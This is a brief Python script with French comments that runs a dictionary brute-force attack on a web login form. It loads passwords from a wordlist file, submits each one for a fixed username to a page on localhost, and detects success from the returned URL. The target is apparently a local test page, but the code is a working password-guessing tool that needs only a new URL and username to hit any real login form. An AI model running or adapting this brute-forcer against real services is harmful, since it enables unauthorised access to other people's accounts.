# Créé par Magnesium, le 23/04/2021 en Python 3.7
#Import des modules nécessaires
import mechanize
import sys

#Accède à la page de connexion
ConnexionInternet = mechanize.Browser()
ConnexionInternet.set_handle_robots(False)
reponse = ConnexionInternet.open("http://localhost:8000/test.html")
#Ouvre le fichier + Lecture
Lecturefichier = open(sys.argv[1])
MdpDico = Lecturefichier.readlines()

#Parcour du fichier tant qu'il y a des lignes
for i in MdpDico :
    ConnexionInternet.select_form(nr = 0)
    ConnexionInternet.form['user'] = "ABCD"
    ConnexionInternet.form['password'] = i.rstrip()
    reponse = ConnexionInternet.submit()

    if reponse.geturl() == "http://localhost:8000/test.html?user=ABCD&password=ABCD": #Si réussi

        print("Mot de passe OK...",i)
        print(reponse.geturl())
        break

    else : #Sinon

      print(reponse.geturl())
      print ("Tentative mot de passe :", i,"...echec")

#Ferme le fichier
Lecturefichier.close()
